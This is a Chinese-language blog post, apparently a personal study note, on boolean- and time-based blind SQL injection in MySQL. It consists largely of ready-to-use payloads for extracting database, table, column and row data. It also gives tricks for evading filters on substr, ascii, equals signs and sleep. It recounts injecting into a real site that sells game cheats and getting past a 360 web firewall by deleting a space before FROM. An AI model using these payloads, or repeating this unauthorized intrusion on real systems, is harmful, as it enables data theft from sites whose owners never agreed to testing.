---
title: "SQL注入学习之盲注"
date: 2019-11-19T22:02:17+08:00
draft: flase
tags: ['SQL注入,盲注']
categories: ['SQL注入']
---
继续学，冲冲冲
<!--more-->

## 基于布尔的盲注
在页面中，如果正确执行了SQL语句，则返回一种页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面，来判断SQL语句正确与否，达到获取数据的目的

### Payload
网上的payload一般是利用ascii()、substr()、length()结合进行利用

- 获取数据库长度

```mysql
and (select length(database()))=长度
```

- 逐字猜解数据库名

```mysql
and (select ascii(substr(database(),位数,1)))=ascii码
```

- 猜解表名数量

```mysql
and (select count(table_name) from information_schema.tables where table_schema=database())=数量

```

- 猜解某个表长度

```mysql
and (select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度
```

- 逐位猜解表名

```mysql
and (select ascii(substr(table_name,1,1)) from information_schema.tables 
where table_schema = database() limit n,1)=ascii码
```

- 猜解列名数量

```mysql
and (select count(*) from information_schema.columns where table_schema =
 database() and table_name = 表名)=数量
```

- 猜解某个列长度

```mysql
and (select length(column_name) from information_schema.columns where table_name="表名" limit n,1)=长度
```

- 逐位猜解列名

```mysql
and (select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name="表名" limit n,1)=ascii码
```

- 判断数据的数量

```mysql
and (select count(列名) from 表名)=数量
```

- 猜解某条数据的长度

```mysql
and (select length(列名) from admin limit n,1)=长度
```

- 逐位猜解数据

```mysql
and (select ascii(substr(user,位数,1)) from admin limit n,1)=ascii码
```


### 盲注tips
#### 过滤了substr函数怎么办
用如下函数

```

left(str,index) 从左边第index开始截取  
right(str,index) 从右边第index开始截取  
substring(str,index) 从左边index开始截取    
mid(str,index,ken) 截取str 从index开始,截取len的长度  
lpad(str,len,padstr) rpad(str,len,padstr) 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果 
 ```
 
#### 过滤了等于号怎么办？
1、用in()

![avatar](https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119103421.png)

2、用like

![avatar](https://sqlmap.wiki/images/QQ截图20191119103614.png)

#### 过滤了ascii()怎么办？
hex() 
bin()
ord()

#### 过滤了字段名怎么办？

1、order by 盲注 

 条件：有回显，给出字段结构

order by用于根据指定的列对结果集进行排序。一般上是从0-9a-z这样排序，不区分大小写。先看下id为1的查询结果<br>

![avatar](https://sqlmap.wiki/images/QQ截图20191119100631.png)

执行如下payload

```mysql
select * from users where id=1 union select 1,'d',3 order by 2
```

![avatar](https://sqlmap.wiki/images/QQ截图20191119100952.png)
发现我们联合查询的数据d排在前面<br>
再执行如下payload

```mysql
select * from users where id=1 union select 1,'z',3 order by 2
```

![avatar]https://sqlmap.wiki/images/QQ截图20191119101219.png
发现联合查询的数据z排在后面了。这是什么意思呢？第一次联合查询的d，排在前面，是因为id为1的数据第一位是d，所以排在前面了。而id为1的数据第一位不是z，所以z就排在后面了，我们可以利用这个特性来进行布尔盲注，只要猜0-9，a-z，逐字猜解就好<br>

2、子查询

这个东西没啥好解释的，直接看payload吧

```mysql
select * from users where id=-1 union select 1,2,x.2 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)x
```

![avatar]https://sqlmap.wiki/images/QQ截图20191119102810.png

### 实例演示
一个卖吃鸡外挂的网站
![avatar](https://sqlmap.wiki/images/QQ截图20191119104843.png)
创建订单那存在SQL注入，利用上面常规payload获取到数据库名了，数据库名为chiji，进行到获取表数量就开始拦截了。
![avatar](https://sqlmap.wiki/images/QQ截图20191119105346.png)
发现是360主机卫士拦截了，本来想按照bypass老哥发的文章进行绕过的，发现各种方法都不行，可能是站长修改了规则。自己测试，发现select 1不拦截。select 1 from不拦截。select 1 from 1拦截。所以我们要破坏select from的结构才能进行绕过。后来询问@撕夜师傅发现去掉from前面的空格即可绕过。后面的步骤参考上面的payload即可

## 基于时间的盲注
布尔盲注是根据页面正常否进行注入，而时间盲注则是通过SQL语句查询的时间来进行注入,一般是在页面无回显，无报错的情况下使用


- 猜解数据库长度

```mysql
and if((select length(database()))=长度,sleep(6),0)
```

- 猜解数据库名

```mysql
and if((select ascii(substr(database(),位数,1))=ascii码),sleep(6),0)
```

- 判断表名的数量

```mysql
and if((select count(table_name) from information_schema.tables where table_schema=database())=个数,sleep(6),0)
```

- 判断某个表名的长度

```mysql
and if((select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度,sleep(6),0)
```

- 逐位猜表名

```mysql
and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema=database() limit n,1)=ascii码,sleep(6),0)
```

- 判断列名数量

```mysql
and if((select count(column_name) from information_schema.columns where table_name="表名")=个数,sleep(6),0)
```

- 判断某个列名的长度

```mysql
and if((select length(column_name) from information_schema.columns where table_name="表名" limit n,1)=长度,sleep(6),0)
```

- 逐位猜列名

```mysql
and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name="表名" limit n,1)=ascii码,sleep(6),0)
```

- 判断数据的数量

```mysql
and if((select count(列名) from 表名)=个数,sleep(6),0)
```

- 判断某个数据的长度

```mysql
and if((select length(列名) from 表名)=长度,sleep(6),0)
```

- 逐位猜数据

```mysql
and if((select ascii(substr(列名,n,1)) from 表名)=ascii码,sleep(6),0)
```

### 时间盲注小tips
如果过滤了sleep，还可以用benchmark()，这个函数第一个值填要执行的次数，第二个填写要执行的表达式

```mysql
 select * from users where id=1 and if(ascii(substring((database()),1,1))>1,(select benchmark(10000000,md5(0x41))),1)
 ```
 
![avatar](https://sqlmap.wiki/images/QQ截图20191119212315.png)

## 参考文章
https://www.t00ls.net/viewthread.php?tid=49626&highlight=SQL%E6%B3%A8%E5%85%A5<br>
https://www.chabug.org/ctf/852.html
